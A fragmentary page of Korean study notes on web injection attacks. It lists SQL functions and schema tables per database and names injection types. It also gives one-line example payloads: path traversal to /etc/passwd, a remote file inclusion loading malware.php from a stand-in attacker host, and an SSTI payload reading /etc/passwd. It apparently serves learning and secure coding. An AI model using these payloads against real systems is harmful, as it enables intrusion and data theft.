...
* 웹 서버, DB, 서비스, 코드의 로직의 취약한 부분을 공격해서 우회, 코드 실행, 정보 유출, 악성코드 감염등의 행위를 일으키는 수법이다.
...
* version(), user(), database(), @@hostname, GROUP\_CONCAT(), CONCAT(), information\_schema.tables, information\_schema.columns

<br>

&#x20;PostgreSQL

* version(), current\_user, current\_database(), CONCAT(), pg\_catalog.pg\_tables, pg\_catalog.pg\_columns

<br>

&#x20;MS SQL Serv

* @@version, SUSER\_SNAME(), DB\_NAME(), HOST\_NAME(), CONCAT(), INFORMATION\_SCHEMA.TABLES, INFORMATION\_SCHEMA.COLUMNS
...
SQLi XSS OS Command LDAP XPath XXE CSS Lang Code (php, python, js) File inclusion injection (LFI, RFI) SSI HTTP header CRLF SSTI NoSQL ORM SOAP
...
imagetag onclick session riding referer
...
* ex) http://victim.com/index.php?page=/../../../../etc/passwd
...
* ex) https://victim.com/index.php?filename=https://attacker.com/malware.php
...
* ex) \{{ get\_flashes\_messages.**globals**.**builtins**.open(/etc/passwd).read() \}}
...
* kisa 시큐어 코딩 가이드 https://www.kisa.or.kr/2060204/form?postSeq=5\&lang\_type=KO\&page=1
